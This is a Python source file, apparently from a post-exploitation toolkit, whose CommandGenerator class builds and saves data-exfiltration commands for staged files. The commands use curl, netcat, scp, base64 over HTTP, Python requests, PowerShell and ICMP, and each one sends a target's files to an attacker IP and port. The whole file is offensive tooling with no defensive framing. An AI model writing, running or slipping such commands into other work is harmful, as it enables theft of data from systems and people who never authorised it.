"""
Generate exfiltration commands for various methods
"""

import os
from typing import List, Dict


class CommandGenerator:
    """Generate commands for different exfiltration methods"""
    
    def generate_all_commands(self, staged_files: List[Dict],
                              attacker_ip: str,
                              attacker_port: int) -> Dict:
        """
        Generate all exfiltration commands
        
        Args:
            staged_files: List of staged file information
            attacker_ip: Attacker IP address
            attacker_port: Attacker port
        
        Returns:
            Dictionary of commands by method
        """
        print("\n" + "="*60)
        print("EXFILTRATION COMMANDS")
        print("="*60)
        
        all_commands = {}
        
        for file_info in staged_files:
            file_path = file_info['staged']
            filename = os.path.basename(file_path)
            
            print(f"\n[FILE: {filename}]")
            print("-"*60)
            
            commands = self._generate_for_file(
                file_path, filename, attacker_ip, attacker_port
            )
            
            all_commands.update(commands)
        
        # Save commands to file
        self._save_commands(all_commands, staged_files[0]['staged'] if staged_files else '/tmp')
        
        return all_commands
    
    def _generate_for_file(self, file_path: str, filename: str,
                          attacker_ip: str, attacker_port: int) -> Dict:
        """Generate commands for a single file"""
        commands = {}
        
        # HTTP POST
        http_cmd = f"curl -X POST -F 'file=@{file_path}' http://{attacker_ip}:{attacker_port}/upload"
        commands[f'{filename}_http'] = http_cmd
        print(f"\n[HTTP POST]")
        print(f"{http_cmd}")
        
        # Netcat
        nc_cmd = f"nc {attacker_ip} {attacker_port} < {file_path}"
        commands[f'{filename}_nc'] = nc_cmd
        print(f"\n[Netcat]")
        print(f"# On attacker: nc -lvnp {attacker_port} > {filename}")
        print(f"# On target: {nc_cmd}")
        
        # Base64 (for small files)
        if os.path.getsize(file_path) < 1024 * 100:
            print(f"\n[Base64 Exfil]")
            print(f"base64 {file_path} | while read line; do curl http://{attacker_ip}:{attacker_port}/$line; done")
        
        # SCP
        scp_cmd = f"scp {file_path} user@{attacker_ip}:/tmp/"
        commands[f'{filename}_scp'] = scp_cmd
        print(f"\n[SCP]")
        print(f"{scp_cmd}")
        
        # Python
        python_cmd = f"python3 -c \"import requests; requests.post('http://{attacker_ip}:{attacker_port}/upload', files={{'file': open('{file_path}', 'rb')}})\""
        commands[f'{filename}_python'] = python_cmd
        print(f"\n[Python]")
        print(f"{python_cmd}")
        
        # PowerShell
        ps_cmd = f"Invoke-WebRequest -Uri http://{attacker_ip}:{attacker_port}/upload -Method POST -InFile {file_path}"
        commands[f'{filename}_powershell'] = ps_cmd
        print(f"\n[PowerShell]")
        print(f"{ps_cmd}")
        
        # ICMP
        print(f"\n[ICMP Exfil (Stealthy)]")
        print(f"# On attacker: python3 icmp_receiver.py")
        print(f"# On target: python3 icmp_exfil.py {file_path} {attacker_ip}")
        
        return commands
    
    def _save_commands(self, commands: Dict, staging_dir: str):
        """Save commands to file"""
        cmd_file = os.path.join(os.path.dirname(staging_dir), 'exfil_commands.txt')
        
        try:
            with open(cmd_file, 'w') as f:
                f.write("EXFILTRATION COMMANDS\n")
                f.write("="*60 + "\n\n")
                for name, cmd in commands.items():
                    f.write(f"[{name}]\n")
                    f.write(f"{cmd}\n\n")
            
            print(f"\n[+] Commands saved to: {cmd_file}")
        except:
            pass